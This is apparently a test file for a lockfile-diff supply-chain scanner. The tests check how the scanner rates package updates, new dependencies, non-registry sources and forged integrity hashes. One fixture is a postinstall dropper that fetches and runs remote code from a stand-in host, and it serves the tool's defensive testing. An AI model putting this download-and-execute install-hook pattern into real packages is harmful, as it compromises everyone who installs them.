import { execFileSync } from "node:child_process";
import { mkdtemp, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { isDepwardError } from "@depward/core";
import { createGateData, preloadAnalyzer } from "@depward/gate";
import { afterEach, beforeAll, beforeEach, describe, expect, test } from "vitest";
import { diffLockfile, type LockfileDiffReport } from "../src/index.ts";
import { fakeRegistry, type FakeRegistry } from "./fake-registry.ts";

const NOW = Date.parse("2026-11-10T12:00:00.000Z");
const data = createGateData([], []);

const DROPPER = `const https = require("https");
const { spawn } = require("child_process");
https.get("https://cdn.example.invalid/stage2.js", (res) => {
  let body = "";
  res.on("data", (c) => (body += c));
  res.on("end", () => spawn(process.execPath, ["-e", body]));
});
`;

function registry(): FakeRegistry {
  return fakeRegistry({
    "fx-a": {
      versions: {
        "1.0.0": {},
        "1.0.1": { files: { "index.js": "module.exports = 1;\n", "install.js": DROPPER }, scripts: { postinstall: "node install.js" }, dependencies: { "fx-young": "^1.0.0" } },
      },
    },
    "fx-b": { versions: { "2.0.0": {}, "2.1.0": { files: { "index.js": "module.exports = 2;\n" } } } },
    "fx-young": { versions: { "1.0.0": { time: "2026-11-08T00:00:00.000Z" } } },
    "fx-old": { versions: { "3.0.0": {} } },
    "fx-keep": { versions: { "1.0.0": {} } },
  });
}

let repo: string;
const git = (...args: string[]): string =>
  execFileSync("git", ["-c", "user.name=t", "-c", "user.email=t@example.invalid", "-c", "commit.gpgsign=false", "-c", "core.autocrlf=false", ...args], { cwd: repo, encoding: "utf8" });

function npmLock(reg: FakeRegistry, packages: Record<string, { version: string; integrity?: string; resolved?: string; dev?: boolean }>): string {
  const out: Record<string, unknown> = { "": { name: "root" } };
  for (const [name, p] of Object.entries(packages)) {
    out[`node_modules/${name}`] = {
      version: p.version,
      resolved: p.resolved ?? `https://registry.npmjs.org/${name}/-/${name}-${p.version}.tgz`,
      integrity: p.integrity ?? reg.integrity(name, p.version),
      ...(p.dev ? { dev: true } : {}),
    };
  }
  return JSON.stringify({ name: "root", lockfileVersion: 3, packages: out }, null, 2);
}

async function commitLock(text: string): Promise<void> {
  await writeFile(join(repo, "package-lock.json"), text);
  git("add", ".");
  git("commit", "-q", "-m", "lock");
}

beforeAll(async () => {
  await preloadAnalyzer();
});
beforeEach(async () => {
  repo = await mkdtemp(join(tmpdir(), "depward-diff-"));
  git("init", "-q", "-b", "main");
});
afterEach(async () => {
  await rm(repo, { recursive: true, force: true });
});

const summary = (r: LockfileDiffReport) => r.packages.map((p) => `${p.kind} ${p.name} ${p.from ? `${p.from}→` : ""}${p.to} ${p.risk}`);

describe("diffLockfile", () => {
  test("diffs updates, checks new packages, and reports non-registry sources", async () => {
    const reg = registry();
    await commitLock(npmLock(reg, { "fx-a": { version: "1.0.0" }, "fx-b": { version: "2.0.0" }, "fx-old": { version: "3.0.0" }, "fx-keep": { version: "1.0.0" } }));
    const head = JSON.parse(npmLock(reg, { "fx-a": { version: "1.0.1" }, "fx-b": { version: "2.1.0" }, "fx-young": { version: "1.0.0" }, "fx-keep": { version: "1.0.0" } })) as { packages: Record<string, unknown> };
    head.packages["node_modules/fx-git"] = { version: "1.0.0", resolved: "git+ssh://git@github.com/example/fx-git.git#0123456789abcdef0123456789abcdef01234567" };
    head.packages["node_modules/fx-local"] = { resolved: "packages/local", link: true };
    await writeFile(join(repo, "package-lock.json"), JSON.stringify(head));

    const report = await diffLockfile({ cwd: repo, base: "main", registry: reg.client, data, now: () => NOW });

    expect(summary(report)).toEqual([
      "updated fx-a 1.0.0→1.0.1 critical",
      "non-registry fx-git 1.0.0 medium",
      "added fx-young 1.0.0 medium",
      "updated fx-b 2.0.0→2.1.0 info",
    ]);
    const a = report.packages[0];
    expect(a?.lockfiles).toEqual(["package-lock.json"]);
    expect(a?.diff?.scriptDelta).toEqual({ postinstall: { to: "node install.js" } });
    // fx-young is itself new (package-too-new), so the dependency on it is high.
    expect(a?.findings.find((f) => f.id === "diff-new-dependency")).toMatchObject({ severity: "high", message: "new dependency: fx-young (itself published recently)" });
    expect(report.packages[2]?.findings.map((f) => f.id)).toContain("package-too-new");
    expect(report.lockfiles).toEqual([{ path: "package-lock.json", format: "npm", counts: { added: 5, removed: 3, changed: 0 }, findings: [] }]);
    expect(report.risk).toBe("critical");
    expect(report.base).toMatch(/^[0-9a-f]{40}$/);
    // Unchanged and removed packages are never fetched.
    expect(reg.requests.filter((u) => u.includes("fx-keep") || u.includes("fx-old"))).toEqual([]);
  });

  test("a lockfile integrity that disagrees with the registry is critical", async () => {
    const reg = registry();
    await commitLock(npmLock(reg, { "fx-keep": { version: "1.0.0" } }));
    const forged = `sha512-${Buffer.alloc(64, 7).toString("base64")}`;
    await writeFile(join(repo, "package-lock.json"), npmLock(reg, {
      "fx-keep": { version: "1.0.0" },
      "fx-old": { version: "3.0.0", integrity: forged, resolved: "https://cdn.example.invalid/fx-old/-/fx-old-3.0.0.tgz" },
    }));
    const report = await diffLockfile({ cwd: repo, base: "HEAD", registry: reg.client, data, now: () => NOW });
    expect(summary(report)).toEqual(["added fx-old 3.0.0 critical"]);
    const finding = report.findings.find((f) => f.id === "lockfile-integrity-mismatch");
    expect(finding?.evidence.map((e) => e.detail)).toEqual(["lockfile integrity", "registry integrity", "lockfile resolved URL"]);
  });

  test("a changed integrity for the same version is re-checked; a dev flag change is not", async () => {
    const reg = registry();
    await commitLock(npmLock(reg, { "fx-keep": { version: "1.0.0", integrity: "sha512-AAAA" }, "fx-old": { version: "3.0.0" } }));
    await writeFile(join(repo, "package-lock.json"), npmLock(reg, { "fx-keep": { version: "1.0.0" }, "fx-old": { version: "3.0.0", dev: true } }));
    const report = await diffLockfile({ cwd: repo, base: "HEAD", registry: reg.client, data, now: () => NOW });
    expect(summary(report)).toEqual(["changed fx-keep 1.0.0 info"]);
  });

  test("a lockfile new in the head makes every entry new, within maxPackages", async () => {
    const reg = registry();
    await commitLock("");
    git("rm", "-q", "package-lock.json");
    git("commit", "-q", "-m", "no lock");
    await writeFile(join(repo, "package-lock.json"), npmLock(reg, { "fx-keep": { version: "1.0.0" }, "fx-old": { version: "3.0.0" } }));
    const report = await diffLockfile({ cwd: repo, base: "HEAD", registry: reg.client, data, now: () => NOW });
    expect(summary(report)).toEqual(["added fx-keep 1.0.0 info", "added fx-old 3.0.0 info"]);
    await expect(diffLockfile({ cwd: repo, base: "HEAD", registry: reg.client, data, now: () => NOW, maxPackages: 1 })).rejects.toSatisfy((e) => isDepwardError(e, "LIMIT_EXCEEDED"));
  });

  test("reads the head from a ref when given", async () => {
    const reg = registry();
    await commitLock(npmLock(reg, { "fx-b": { version: "2.0.0" } }));
    await commitLock(npmLock(reg, { "fx-b": { version: "2.1.0" } }));
    await writeFile(join(repo, "package-lock.json"), "not json");
    const report = await diffLockfile({ cwd: repo, base: "HEAD~1", head: "HEAD", registry: reg.client, data, now: () => NOW });
    // HEAD~1 and HEAD: the merge-base with HEAD~1 is HEAD~1.
    expect(summary(report)).toEqual(["updated fx-b 2.0.0→2.1.0 info"]);
    expect(report.head).toBe("HEAD");
  });

  test("a registry failure becomes an error, not a throw", async () => {
    const reg = registry();
    await commitLock(npmLock(reg, { "fx-gone": { version: "1.0.0", integrity: "sha512-AAAA" } }));
    await writeFile(join(repo, "package-lock.json"), npmLock(reg, { "fx-gone": { version: "1.0.1", integrity: "sha512-BBBB" } }));
    const report = await diffLockfile({ cwd: repo, base: "HEAD", registry: reg.client, data, now: () => NOW });
    expect(report.packages[0]?.errors.map((e) => e.code)).toEqual(["NOT_FOUND"]);
  });

  test("without --base, a missing origin/HEAD asks for --base", async () => {
    const reg = registry();
    await commitLock(npmLock(reg, {}));
    await expect(diffLockfile({ cwd: repo, registry: reg.client, data })).rejects.toSatisfy(
      (e) => isDepwardError(e, "GIT") && /--base/.test(e.message),
    );
  });
});
